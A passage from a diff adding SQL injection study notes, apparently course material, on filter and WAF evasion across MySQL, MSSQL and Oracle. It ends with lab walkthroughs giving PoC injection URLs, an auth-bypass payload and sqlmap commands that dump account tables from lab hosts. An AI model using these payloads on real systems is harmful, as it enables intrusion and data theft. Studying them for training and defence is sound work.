+SELECT CONCAT_WS<span class="o">(</span><span class="s1">''</span><span class="nb">.</span> <span class="s1">'He'</span>, <span class="s1">'ll'</span>, <span class="s1">'o'</span><span class="o">)</span>
+</code></pre></div></div>
+
+<p>Its possible to concatenate using mix of comments in C-Style:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT <span class="s1">'He'</span>/<span class="k">**</span>/<span class="s1">'ll'</span>/<span class="k">**</span>/<span class="s1">'o'</span>
+SELECT /<span class="k">**</span>/<span class="s1">'He'</span>/<span class="k">**</span>/<span class="s1">'ll'</span>/<span class="k">**</span>/<span class="s1">'o'</span>/<span class="k">**</span>/
+SELECT /<span class="k">*</span><span class="o">!</span>10000 <span class="s1">'He'</span> <span class="k">*</span>/<span class="s1">'ll'</span>/<span class="k">*****</span>/<span class="s1">'o'</span>/<span class="k">*****</span>/
+</code></pre></div></div>
+
+<p>in MSSQL:
+Can be done by using both the operator (+) and the function CONCAT
+→ http://msdn.microsoft.com/en-us/library/hh231515.aspx</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT <span class="s1">'He'</span>+<span class="s1">'ll'</span>+<span class="s1">'o'</span>
+SELECT CONCAT<span class="o">(</span><span class="s1">'He'</span>,<span class="s1">'ll'</span>,<span class="s1">'o'</span><span class="o">)</span>
+</code></pre></div></div>
+
+<p>We can obfuscate by using C-Style comments:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT <span class="s1">'He'</span>/<span class="k">**</span>/+/<span class="k">**</span>/<span class="s1">'ll'</span>/<span class="k">**</span>/+<span class="s1">'o'</span>
+SELECT CONCAT<span class="o">(</span>/<span class="k">**</span>/<span class="s1">'He'</span>,/<span class="k">**</span>/1/<span class="k">**</span>/,/<span class="k">**</span>/<span class="s1">'lo'</span>/<span class="k">**</span>/<span class="o">)</span>
+</code></pre></div></div>
+
+<p>In Oracle:
+The operator is <strong>||</strong> and, from the function perspective, we can use <strong>CONCAT</strong> and <strong>NVL</strong>:</p>
+
+<p>→ https://docs.oracle.com/cd/B28359_01/server.111/b28286/functions026.htm#SQLRF00619</p>
+
+<p>→ https://docs.oracle.com/cd/B28359_01/server.111/b28286/functions110.htm#SQLRF00684</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT <span class="s1">'He'</span><span class="o">||</span><span class="s1">'ll'</span><span class="o">||</span><span class="s1">'o'</span>
+SELECT CONCAT<span class="o">(</span><span class="s1">'He'</span>,<span class="s1">'llo'</span><span class="o">)</span>
+SELECT NVL<span class="o">(</span><span class="s1">'Hello'</span>, <span class="s1">'Goodbye'</span><span class="o">)</span>
+</code></pre></div></div>
+
+<p>Obfuscating the string concatenation:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT q<span class="s1">'[]'</span><span class="o">||</span><span class="s1">'He'</span><span class="o">||</span><span class="s1">'ll'</span>/<span class="k">**</span>/<span class="s1">'o'</span>
+SELECT CONCAT<span class="o">(</span>/<span class="k">**</span>/<span class="s1">'He'</span>/<span class="k">**</span>/,/<span class="k">**</span>/<span class="s1">'ll'</span>/<span class="k">**</span>/<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Integers:</p>
+<ul>
+  <li>Example is to use the value PI (3,141593…). With FLOOR to obtain the value 3, and CEIL to obtain the value 4</li>
+  <li>We can use system function like version() and obtain the value 5,6</li>
+</ul>
+
+<p>For example</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ceil<span class="o">(</span>pi<span class="o">()</span><span class="k">*</span>3<span class="o">)</span> <span class="o">=</span> 10
+</code></pre></div></div>
+
+<h3 id="mysql-type-conversion">MySQL Type Conversion</h3>
+<p>Combining arithmetic operations with different types:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT ~<span class="s1">'-2it\'</span>s a kind of magic<span class="s1">'
+</span></code></pre></div></div>
+
+<p>Numbers vs Booleans:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT ... <span class="nv">1</span><span class="o">=</span>TRUE
+SELECT ... 2! <span class="o">=</span>TRUE
+SELECT ... OR 1
+SELECT ... AND 1
+</code></pre></div></div>
+
+<p>Strings vs Numbers vs Booleans:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT ... VERSION<span class="o">()=</span>5.5 <span class="c">#5.5.30</span>
+SELECT ... @@VERSION<span class="o">()=</span>5.5 <span class="c">#5.5.30</span>
+SELECT ... <span class="o">(</span><span class="s1">'type'</span>+<span class="s1">'cast'</span><span class="o">)=</span>0 <span class="c">#TRUE</span>
+SELECT ~<span class="s1">'-2it\'</span>s a kind of mafic<span class="s1">'        '</span><span class="c">#1</span>
+SELECT ~<span class="s1">'-1337a kind of magic'</span><span class="nt">-25</span> <span class="c">#1337</span>
+</code></pre></div></div>
+
+<p>Bypassing Authentication:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Put all of this together and try to think of some alternatives to the classic</span>
+
+x<span class="s1">' OR 1='</span>1
+</code></pre></div></div>
+
+<h2 id="bypassing-keyword-filters">Bypassing Keyword Filters</h2>
+<p>The first limitation are restriction on keywords</p>
+
+<h3 id="case-changing">Case Changing</h3>
+<p>The simplest is just change the cases of each character:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SeLeCt
+SEleCT
+etc
+</code></pre></div></div>
+
+<p>sqlmap has a tampering script to automate this case changing</p>
+
+<p>→ https://github.com/sqlmapproject/sqlmap/blob/master/tamper/randomcase.py</p>
+
+<h3 id="using-intermediary-characters">Using Intermediary Characters</h3>
+<p>We can use both comments instead of spaces and depending on the DBMS version,  a list of the whitespace that are not matched as spaces:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT/<span class="k">**</span>/values/<span class="k">**</span>/and/<span class="k">**</span>/.../<span class="k">**</span>/or/<span class="k">**</span>/
+SELECT[sp]values[sp]and...[sp]or[sp]
+</code></pre></div></div>
+
+<h3 id="using-alternative-techniques">Using alternative Techniques</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT<span class="s2">"values"</span>from<span class="s1">'table'</span>where/<span class="k">**</span>/1
+SELECT<span class="o">(</span>values<span class="o">)</span>from<span class="o">(</span>table<span class="o">)</span>where<span class="o">(</span>1<span class="o">)</span>
+SELECT<span class="s2">"values"</span><span class="s1">''</span>from<span class="s1">'table'</span>where<span class="o">(</span>1<span class="o">)</span>
+SELECT+<span class="s2">"values"</span>%A0from<span class="s1">'table'</span>
+</code></pre></div></div>
+
+<h3 id="circumventing-by-encoding">Circumventing by Encoding</h3>
+<p>It all depends on how the application processes data</p>
+
+<ul>
+  <li>between the attacker and the application, there are many layers, such as a proxy, firewall, etc. If some of these layers handle the encoding differently, there could be a possible bypass</li>
+</ul>
+
+<p>URL Encoding:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Usually when the requests are sent through the internet via HTTP, they are URL encoded.
+- In this <span class="k">case</span> we can send the entire string URL-encoded
+</code></pre></div></div>
+
+<p>Double URL Encoding:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># If u encode a URL-Encoded string, they u are performing a Double URL-Encoding</span>
+
+s <span class="o">=</span> %73 <span class="o">&gt;</span> %2573
+</code></pre></div></div>
+
+<blockquote>
+  <p>IN this case, if the filter decodes the request the first time and applies the rules, it will not find anything dangerous</p>
+</blockquote>
+
+<blockquote>
+  <p>Then when the application receives the request, it will decode the contents and trigger the malicious request</p>
+</blockquote>
+
+<h3 id="replaced-keywords">Replaced Keywords</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Booleans <span class="o">&gt;</span> AND, OR
+- AND <span class="o">=</span> <span class="o">&amp;&amp;</span>
+- OR  <span class="o">=</span> <span class="o">||</span>
+<span class="c"># only in MySQL and MSSQL</span>
+WHERE <span class="nv">ID</span><span class="o">=</span>x <span class="o">&amp;&amp;</span> <span class="nv">1</span><span class="o">=</span>1
+WHERE <span class="nv">ID</span><span class="o">=</span>x <span class="o">||</span> <span class="nv">1</span><span class="o">=</span>1
+
+<span class="c"># If &amp;&amp; and || are filtered, then u must use 'UNION'</span>
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>UNION <span class="o">&gt;</span> Simple <span class="k">case</span>
+<span class="c"># We can use many variants to elude these kind of filters:</span>
+
+UNION<span class="o">(</span>SELECT <span class="s1">'VALUES'</span>...<span class="p">)</span> <span class="o">&amp;&amp;</span>
+UNION ALL SELECT ...
+UNION DISTINCT SELECT ...
+/<span class="k">*</span><span class="o">!</span>00000 UNION<span class="k">*</span>//<span class="k">*</span><span class="o">!</span>00000 SELECT<span class="k">*</span>/ ...
+</code></pre></div></div>
+
+<p>WHen the <strong>UNION</strong> is filtered, we must switch to blind SQLi exploitation:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>SELECT <span class="nb">id </span>FROM <span class="nb">users </span>LIMIT 1<span class="o">)=</span><span class="s1">'5 ...
+</span></code></pre></div></div>
+
+<p>In Oracle:</p>
+
+<p>→ https://docs.oracle.com/cd/B28359_01/server.111/b28286/queries004.htm#SQLRF52323</p>
+
+<ul>
+  <li>We can use <strong>INTERSECT</strong> or <strong>MINUS</strong> operators</li>
+</ul>
+
+<p>WHERE, GROUP, LIMIT, HAVING:</p>
+
+<ul>
+  <li>Useful keywords to select a specific entry</li>
+</ul>
+
+<p>If the filter blocks <strong>WHERE</strong> keyword, we can alternatively use <strong>GROUP BY</strong> + <strong>HAVING</strong>:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT <span class="nb">id </span>FROM <span class="nb">users </span>GROUP BY <span class="nb">id </span>HAVING <span class="nb">id</span><span class="o">=</span><span class="s1">'5 ...
+</span></code></pre></div></div>
+
+<p>If <strong>GROUP BY</strong> is filtered, we must revert to blind SQLi:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>AND length<span class="o">((</span><span class="k">select </span>first char<span class="o">)=</span><span class="s1">'a'</span><span class="o">)</span> //0/1 <span class="o">&gt;</span> <span class="nb">true</span>/false
+</code></pre></div></div>
+
+<p>If <strong>HAVING</strong> is filterd, in this case we must leverage functions like <strong>GROUP_CONCAT</strong>, functions that manipulates strings, etc. Of course, all of this is blind!</p>
+
+<p>If <strong>SELECT</strong> is filtered, The exploitation can vary and really depends upon the injection point.</p>
+
+<p>You need to use functions that manipulate FILES such as:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>load_files //in mysql
+</code></pre></div></div>
+
+<p>Another option, brute-force or guess the column names by appending other <strong>WHERE</strong> condition such as:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>AND COLUMN IS NOT NULL ...
+</code></pre></div></div>
+
+<p>Alternatively, being able to invoke the <strong>stored procedure analyse()</strong></p>
+
+<p>→ http://dev.mysql.com/doc/refman/5.7/en/procedure-analyse.html</p>
+
+<p>This <strong>sproc</strong> returns juicy information about the query just executed:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT <span class="k">*</span> FROM employees procedure analyse<span class="o">()</span>
+</code></pre></div></div>
+
+<h2 id="bypassing-function-filters">Bypassing Function Filters</h2>
+
+<p>Lets now unpack useful techniques and alternative functions For use in these types of scenarios</p>
+
+<h3 id="building-strings">Building Strings</h3>
+<p>In the DBMS Gadget chapter, we discussed how to generate strings but, we used quotes. Building strings without quotes is a little bit tricky:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- UNHEX
+- HEX
+- CHAR
+- ASCII
+- ORD
+</code></pre></div></div>
+
+<p>UNHEX is useful in translating hexadecimal numbers to string:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- http://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_unhex
+
+SUBSTR<span class="o">(</span>USERNAME,1,1<span class="o">)=</span>UNHEX<span class="o">(</span>48<span class="o">)</span>
+SUBSTR<span class="o">(</span>USERNAME,1,2<span class="o">)=</span>UNHEX<span class="o">(</span>4845<span class="o">)</span>
+...
+SUBSTR<span class="o">(</span>USERNAME,1,5<span class="o">)=</span>UNHEX<span class="o">(</span><span class="s1">'48454C4C4F'</span><span class="o">)</span>
+SUBSTR<span class="o">(</span>USERNAME,1,2<span class="o">)=</span>0x48454C4C4F
+</code></pre></div></div>
+
+<p>HEX function is useful to convert o hexadecimal:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- http://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_hex
+
+HEX<span class="o">(</span>SUBSTR<span class="o">(</span>USERNAME,1,1<span class="o">))=</span>48
+HEX<span class="o">(</span>SUBSTR<span class="o">(</span>USERNAME,1,2<span class="o">))=</span>4845
+...
+HEX<span class="o">(</span>SUBSTR<span class="o">(</span>USERNAME,1,5<span class="o">))=</span><span class="s1">'48454C4C4F'</span>
+</code></pre></div></div>
+
+<p>CHAR can also be used:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- http://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_char
+
+SUBSTR<span class="o">(</span>USERNAME,1,1<span class="o">)=</span>CHAR<span class="o">(</span>72<span class="o">)</span>
+SUBSTR<span class="o">(</span>USERNAME,1,2<span class="o">)=</span>CHAR<span class="o">(</span>72,69<span class="o">)</span>
+...
+SUBSTR<span class="o">(</span>USERNAME,1,1<span class="o">)=</span>CONCAT<span class="o">(</span>CHAR<span class="o">(</span>72<span class="o">)</span>,CHAR<span class="o">(</span>69<span class="o">))</span>
+</code></pre></div></div>
+
+<p>ASCII and ORD: twin functions:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- http://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_ascii
+- http://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_ord
+
+ASCII<span class="o">(</span>SUBSTR<span class="o">(</span>USERNAME,1,1<span class="o">))=</span>48
+ORD<span class="o">(</span>SUBSTR<span class="o">(</span>USERNAME,1,1<span class="o">))=</span>48
+</code></pre></div></div>
+
+<p>CONV:
+mySQL offers an interesting method in returning the string representation of a number from two bases</p>
+
+<ul>
+  <li>http://dev.mysql.com/doc/refman/5.7/en/mathematical-functions.html#function_conv</li>
+</ul>
+
+<blockquote>
+  <p>The highest base we can use is 36</p>
+</blockquote>
+
+<p>We cannot use For <strong>unicode</strong> characters; however, at least we can generate a string from a-zA-Z0-9:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>CONV<span class="o">(</span>10,10,36<span class="o">)</span> //<span class="s1">'a'</span>
+CONV<span class="o">(</span>11,10,36<span class="o">)</span> //<span class="s1">'b'</span>
+</code></pre></div></div>
+
+<p>We can mix the results with <strong>upper</strong> and <strong>lower</strong> functions to retrieve the respective representation:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>LOWER<span class="o">(</span>CONV<span class="o">(</span>10,10,36<span class="o">))</span> <span class="c">#'a'</span>
+LCASE<span class="o">(</span>CONV<span class="o">(</span>10,10,36<span class="o">))</span> <span class="c">#'a'</span>
+UPPER<span class="o">(</span>CONV<span class="o">(</span>10,10,36<span class="o">))</span> <span class="c">#'A'</span>
+UCASE<span class="o">(</span>CONV<span class="o">(</span>10,10,36<span class="o">))</span> <span class="c">#'A'</span>
+...
+</code></pre></div></div>
+
+<h3 id="brute-force-strings">Brute-force Strings</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- LOCATE
+- INSTR
+- POSITION
+</code></pre></div></div>
+<p>If u cannot build a string, u can try to locate either a segment or an entire string using functions that return the position of the first occurrence of substrings, and then use conditional statements For the Boolean condition.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>IF<span class="o">(</span>LOCATE<span class="o">(</span><span class="s1">'H'</span>,SUBSTR<span class="o">(</span>USERNAME,1,1<span class="o">))</span>,1,0<span class="o">)</span>
+<span class="c"># u can also use functions 'INSTR' and 'POSITION'</span>
+</code></pre></div></div>
+
+<h3 id="building-substring">Building Substring</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- SUBSTR
+- MID
+- SUBSTRING
+</code></pre></div></div>
+
+<p>MID is a synonym of SUBSTRING, which is a synonym of SUBSTR:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>SUBSTR|MID|SUBSTRING]<span class="o">(</span><span class="s1">'HELLO'</span> FROM 1 FOR 1<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Alternatively, functions <strong>LEFT</strong> and <strong>RIGHT</strong></p>
+
+<p>→ http://dev.mysql.com/doc/refman/5.0/en/string-functions.html#function_left</p>
+
+<p>→ http://dev.mysql.com/doc/refman/5.0/en/string-functions.html#function_right</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>LEFT|RIGHT]<span class="o">(</span><span class="s1">'HELLO'</span>,2<span class="o">)</span> //HE or LO
+</code></pre></div></div>
+
+<p>More options functions like <strong>RPAD</strong> and <strong>LPAD</strong>:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>LPAD,RPAD]<span class="o">(</span><span class="s1">'HELLO'</span>,6,<span class="s1">'?'</span><span class="o">)</span> //?HELLO or HELLO?
+<span class="o">[</span>LPAD,RPAD]<span class="o">(</span><span class="s1">'HELLO'</span>,1,<span class="s1">'?'</span><span class="o">)</span> //H
+...
+<span class="o">[</span>LPAD,RPAD]<span class="o">(</span><span class="s1">'HELLO'</span>,5,<span class="s1">'?'</span><span class="o">)</span> //HELLO 
+</code></pre></div></div>
+
+<h2 id="labs">Labs</h2>
+<p>Note: Different sqlmap versions may require different options/flags. For example lab 4 may be solved using the below:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlmap <span class="nt">-u</span> <span class="s1">'http://192.222.62.2/upload.php?lab=4&amp;payload='</span> <span class="nt">-p</span> payload <span class="nt">--technique</span><span class="o">=</span>B <span class="nt">--dbms</span> MySQL <span class="nt">--no-cast</span> <span class="nt">--tamper</span><span class="o">=</span>symboliclogical <span class="nt">--threads</span><span class="o">=</span>10 <span class="nt">--banner</span> <span class="nt">--flush-session</span> <span class="nt">--regexp</span><span class="o">=</span><span class="s1">'99\sviews'</span>  <span class="nt">--prefix</span><span class="o">=</span><span class="s2">"01.jpg'"</span>
+</code></pre></div></div>
+
+<h3 id="1---entry-level">1 - ENTRY LEVEL</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Query:</span>
+<span class="nv">$query</span> <span class="o">=</span> <span class="s2">"SELECT views from attachments where filename='</span><span class="nv">$filename</span><span class="s2">'"</span><span class="p">;</span>
+
+
+<span class="c"># PoC</span>
+http://hacker.site/2nd/view.php?payload<span class="o">=</span>%27%20union%20select%20@@version<span class="p">;</span>%20--%20-
+
+<span class="c"># SQLMAP</span>
+./sqlmap.py <span class="nt">-u</span> <span class="s1">'http://hacker.site/2nd/view.php?payload=a'</span> <span class="nt">--technique</span><span class="o">=</span>U <span class="nt">--suffix</span><span class="o">=</span><span class="s1">'; -- -'</span> <span class="nt">--banner</span>
+	
+./sqlmap.py <span class="nt">-u</span> <span class="s1">'http://hacker.site/2nd/view.php?payload=a'</span> <span class="nt">--technique</span><span class="o">=</span>U <span class="nt">--suffix</span><span class="o">=</span><span class="s1">'; -- -'</span> <span class="nt">-D</span> selfie4you01 <span class="nt">-T</span> accounts <span class="nt">--dump</span> <span class="nt">--no-cast</span>
+</code></pre></div></div>
+
+<h3 id="2---union-select">2 - UNION SELECT</h3>
+<ul>
+  <li>no filters</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Filters: none
+
+Query:
+<span class="nv">$query</span> <span class="o">=</span> <span class="s2">"SELECT views FROM attachments where filename='</span><span class="nv">$entry</span><span class="s2">';"</span><span class="p">;</span>
+
+
+<span class="c"># PoC</span>
+http://hacker.site/2nd/upload.php?lab<span class="o">=</span>2&amp;payload<span class="o">=</span><span class="s1">'+union+select+@@version;%23
+
+# SQLMAP
+./sqlmap.py -u "http://hacker.site/2nd/upload.php?lab=2&amp;payload=_" -p payload --technique=U --suffix='</span><span class="p">;</span><span class="c">#' --union-col=1 --dbms MySQL --banner --no-cast</span>
+
+./sqlmap.py <span class="nt">-u</span> <span class="s2">"http://hacker.site/2nd/upload.php?lab=2&amp;payload=_"</span> <span class="nt">-p</span> payload <span class="nt">--technique</span><span class="o">=</span>U <span class="nt">--suffix</span><span class="o">=</span><span class="s1">';#'</span> <span class="nt">--union-col</span><span class="o">=</span>1 <span class="nt">--dbms</span> MySQL <span class="nt">-D</span> selfie4you02 <span class="nt">-T</span> accounts <span class="nt">--dump</span> <span class="nt">--no-cast</span>
+
+</code></pre></div></div>
+
+<h3 id="3---union-select">3 - UNION SELECT</h3>
+<ul>
+  <li>randomcase filter</li>
+  <li>union-char it’s not required here</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Filters:
+/UNION/
+/SELECT/
+
+Query:
+<span class="nv">$query</span> <span class="o">=</span> <span class="s2">"SELECT views FROM attachments where filename='</span><span class="nv">$entry</span><span class="s2">';"</span><span class="p">;</span>
+
+
+<span class="c"># PoC</span>
+http://hacker.site/2nd/upload.php?lab<span class="o">=</span>3&amp;payload<span class="o">=</span>a%27%20UNIoN%20SeLECT%20%27PoC%20String%27<span class="p">;</span>%20--%20-
+
+<span class="c"># SQLMAP</span>
+
+./sqlmap.py <span class="nt">-u</span> <span class="s1">'http://hacker.site/2nd/upload.php?lab=3&amp;payload=b'</span> <span class="se">\</span>
+	<span class="nt">-p</span> payload <span class="nt">--technique</span><span class="o">=</span>U <span class="nt">--suffix</span><span class="o">=</span><span class="s1">';#'</span> <span class="nt">--dbms</span> MySQL <span class="nt">--union-col</span><span class="o">=</span>1 <span class="nt">--no-cast</span> <span class="se">\</span>
+	<span class="nt">--tamper</span><span class="o">=</span>randomcase <span class="nt">--banner</span>
+
+./sqlmap.py <span class="nt">-u</span> <span class="s1">'http://hacker.site/2nd/upload.php?lab=3&amp;payload=b'</span> <span class="se">\</span>
+	<span class="nt">-p</span> payload <span class="nt">--technique</span><span class="o">=</span>U <span class="nt">--suffix</span><span class="o">=</span><span class="s1">';#'</span> <span class="nt">--dbms</span> MySQL <span class="nt">--union-col</span><span class="o">=</span>1 <span class="nt">--no-cast</span> <span class="se">\</span>
+	<span class="nt">--tamper</span><span class="o">=</span>randomcase <span class="nt">-D</span> selfie4you03 <span class="nt">-T</span> accounts <span class="nt">--dump</span>
+</code></pre></div></div>
+
+<h3 id="4---boolean-based-blind">4 - Boolean-based blind</h3>
+<ul>
+  <li>UNION filtered out</li>
+  <li>
+    <table>
+      <tbody>
+        <tr>
+          <td>symboliclogical filter (AND &gt; &amp;&amp; , OR &gt;</td>
+          <td> </td>
+          <td>)</td>
+        </tr>
+      </tbody>
+    </table>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Filters:
+/UNION/i
+/<span class="se">\ </span>AND<span class="se">\ </span>/i
+
+Query:
+<span class="nv">$query</span> <span class="o">=</span> <span class="s2">"SELECT views FROM attachments where filename='</span><span class="nv">$entry</span><span class="s2">';"</span><span class="p">;</span>
+
+
+<span class="c"># POCs</span>
+
+<span class="c"># (%26) == &amp;</span>
+TRUE:	http://hacker.site/2nd/upload.php?lab<span class="o">=</span>4&amp;payload<span class="o">=</span>01.jpg<span class="s1">'+%26%26+'</span>123<span class="s1">'='</span>123
+FALSE:	http://hacker.site/2nd/upload.php?lab<span class="o">=</span>4&amp;payload<span class="o">=</span>01.jpg<span class="s1">'+%26%26+'</span>123<span class="s1">'='</span>1
+
+<span class="c"># using true (1) and false (0)booleans</span>
+<span class="c"># (%23) == #</span>
+TRUE:	http://hacker.site/2nd/upload.php?lab<span class="o">=</span>4&amp;payload<span class="o">=</span>01.jpg<span class="s1">'+%26%26+TRUE;%23
+FALSE:	http://hacker.site/2nd/upload.php?lab=4&amp;payload=01.jpg'</span>+%26%26+FALSE<span class="p">;</span>%23
+
+
+<span class="c"># SQLMAP</span>
+./sqlmap.py <span class="nt">-u</span> <span class="s1">'http://hacker.site/2nd/upload.php?lab=4&amp;payload=X'</span> <span class="se">\</span>
+	<span class="nt">-p</span> payload <span class="nt">--technique</span><span class="o">=</span>B <span class="nt">--dbms</span> MySQL <span class="nt">--no-cast</span> <span class="nt">--tamper</span><span class="o">=</span>symboliclogical <span class="nt">--threads</span><span class="o">=</span>10 <span class="se">\</span>
+	<span class="nt">--banner</span> <span class="nt">--flush-session</span>
+
+./sqlmap.py <span class="nt">-u</span> <span class="s1">'http://hacker.site/2nd/upload.php?lab=4&amp;payload=X'</span> <span class="se">\</span>
+	<span class="nt">-p</span> payload <span class="nt">--technique</span><span class="o">=</span>B <span class="nt">--dbms</span> MySQL <span class="nt">--no-cast</span> <span class="nt">--tamper</span><span class="o">=</span>symboliclogical <span class="nt">--threads</span><span class="o">=</span>10 <span class="se">\</span>
+	<span class="nt">-D</span> selfie4you04 <span class="nt">-T</span> accounts <span class="nt">--dump</span>
+
+</code></pre></div></div>
+
+<h3 id="5---boolean-based-blind">5 - Boolean-based blind</h3>
+<ul>
+  <li>UNION filtered out</li>
+  <li>
+    <table>
+      <tbody>
+        <tr>
+          <td>symboliclogical filter (AND &gt; &amp;&amp; , OR &gt;</td>
+          <td> </td>
+          <td>)</td>
+        </tr>
+      </tbody>
+    </table>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Filters:
+/UNION/i
+/<span class="se">\ </span>AND<span class="se">\ </span>/i
+/<span class="se">\ </span>OR<span class="se">\ </span>/i
+
+Query<span class="p">;</span>
+<span class="nv">$query</span> <span class="o">=</span> <span class="s2">"SELECT views FROM attachments where filename='</span><span class="nv">$entry</span><span class="s2">';"</span><span class="p">;</span>
+
+
+POCs:
+<span class="c"># same as #4 but with filter that applies to OR too </span>
+<span class="c"># (%7C) == |</span>
+
+<span class="c"># SQLMAP</span>
+./sqlmap.py <span class="nt">-u</span> <span class="s1">'http://hacker.site/2nd/upload.php?lab=5&amp;payload=X'</span> <span class="se">\</span>
+	<span class="nt">-p</span> payload <span class="nt">--technique</span><span class="o">=</span>B <span class="nt">--dbms</span> MySQL <span class="nt">--no-cast</span> <span class="nt">--tamper</span><span class="o">=</span>symboliclogical <span class="nt">--threads</span><span class="o">=</span>10 <span class="se">\</span>
+	<span class="nt">--banner</span> <span class="nt">--flush-session</span>
+
+./sqlmap.py <span class="nt">-u</span> <span class="s1">'http://hacker.site/2nd/upload.php?lab=5&amp;payload=X'</span> <span class="se">\</span>
+	<span class="nt">-p</span> payload <span class="nt">--technique</span><span class="o">=</span>B <span class="nt">--dbms</span> MySQL <span class="nt">--no-cast</span> <span class="nt">--tamper</span><span class="o">=</span>symboliclogical <span class="nt">--threads</span><span class="o">=</span>10 <span class="se">\</span>
+	<span class="nt">-D</span> selfie4you05 <span class="nt">-T</span> accounts <span class="nt">--dump</span> 
+
+</code></pre></div></div>
+
+<h3 id="6---boolean-based-blind">6 - Boolean-based blind</h3>
+<ul>
+  <li>UNION filtered out</li>
+  <li>
+    <table>
+      <tbody>
+        <tr>
+          <td>symboliclogical filter (AND &gt; &amp;&amp; , OR &gt;</td>
+          <td> </td>
+          <td>)</td>
+        </tr>
+      </tbody>
+    </table>
+  </li>
+  <li>space to verical tab filter to bypass [space]OR filter</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Filters:
+/UNION/i
+/AND/i
+/ OR/i
+
+Query<span class="p">;</span>
+<span class="nv">$query</span> <span class="o">=</span> <span class="s2">"SELECT views FROM attachments where filename='</span><span class="nv">$entry</span><span class="s2">';"</span><span class="p">;</span>
+
+<span class="c"># SQLMAP</span>
+
+./sqlmap.py <span class="nt">-u</span> <span class="s2">"http://hacker.site/2nd/upload.php?lab=6&amp;payload=x"</span> <span class="se">\</span>
+	<span class="nt">-p</span> payload <span class="nt">--technique</span><span class="o">=</span>B <span class="nt">--dbms</span> MySQL <span class="nt">--suffix</span><span class="o">=</span><span class="s1">';#'</span> <span class="nt">--tamper</span><span class="o">=</span><span class="s2">"symboliclogical, space2VT.py"</span> <span class="se">\</span>
+	<span class="nt">--no-cast</span> <span class="nt">--threads</span><span class="o">=</span>10 <span class="nt">-v</span> 3 <span class="se">\</span>
+	<span class="nt">--banner</span> <span class="nt">--flush-session</span> 
+	
+./sqlmap.py <span class="nt">-u</span> <span class="s2">"http://hacker.site/2nd/upload.php?lab=6&amp;payload=x"</span> <span class="se">\</span>
+	<span class="nt">-p</span> payload <span class="nt">--technique</span><span class="o">=</span>B <span class="nt">--dbms</span> MySQL <span class="nt">--suffix</span><span class="o">=</span><span class="s1">';#'</span> <span class="se">\</span>
+	<span class="nt">--tamper</span><span class="o">=</span><span class="s2">"symboliclogical, space2VT.py"</span> <span class="se">\</span>
